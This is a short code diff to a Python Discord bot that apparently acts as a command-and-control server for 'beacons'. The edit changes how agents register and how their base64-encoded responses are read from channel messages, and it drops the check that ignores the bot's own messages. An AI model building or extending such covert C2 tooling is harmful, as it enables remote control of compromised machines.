@@ -84,8 +84,8 @@ async def fetchResponse(channel, beaconId):
     Fetch responses from the beacon via Discord messages.
     """
     async for message in channel.history(limit=100):  # Adjust limit as needed
-        if message.content.startswith(f"Response from {beaconId}:"):
-            encoded_response = message.content.split(f"Response from {beaconId}: ")[1]
+        if message.content.startswith(f"{beaconId}:RespForYou"):
+            encoded_response = message.content.split(f"{beaconId}:RespForYou: ")[1]
             return encoder_base64.decode(encoded_response)
     return None
 
@@ -125,15 +125,12 @@ async def on_message(message):
     Triggered when the bot receives a message.
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
-    if message.author == client.user:
-        return  # Ignore own messages
-
     if message.channel.id == COMMAND_CHANNEL_ID:
-        if message.content.startswith("AGENT:"):
-            beaconId = message.content.split("AGENT:")[1]
+        if message.content.startswith("[+] Registering new agent AGENT:"):
+            beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
             print(f"New agent registered: {beaconId}")
 
-            # Start a new task loop for this agent
+                # Start a new task loop for this agent
             if beaconId not in beacons:
                 print(f"[+] Established new session {beaconId}. Starting task loop.")
                 channel = message.channel
